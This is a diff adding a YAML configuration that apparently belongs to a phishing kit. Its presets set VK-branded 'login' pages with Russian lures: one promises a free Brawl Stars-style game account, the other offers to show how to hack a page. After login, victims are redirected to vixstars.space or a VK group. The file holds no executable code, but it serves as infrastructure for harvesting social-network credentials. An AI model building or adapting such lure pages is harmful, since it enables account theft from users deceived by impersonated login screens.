@@ -1,0 +1,23 @@
+use: brawlstars
+presets:
+  brawlstars:
+    afterLoginTitle: Перенаправление...
+    afterLoginImage: https://media.giphy.com/media/RjfixZOaPkjWSU556O/giphy.gif
+    afterLoginUrl: https://vixstars.space
+    afterLoginRedirTime: 5
+
+    beforeLoginImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
+    beforeLoginSocialImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
+    beforeLoginTitle: M-Game | Получение аккаунта
+    beforeLoginRedirTime: 1
+
+  xxhax:
+    afterLoginTitle: Перенаправление...
+    afterLoginImage: https://media.giphy.com/media/RjfixZOaPkjWSU556O/giphy.gif
+    afterLoginUrl: https://vk.com/xxhax
+    afterLoginRedirTime: 5
+
+    beforeLoginImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
+    beforeLoginSocialImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
+    beforeLoginTitle: Xacker.io | Как взломать страницу
+    beforeLoginRedirTime: 1
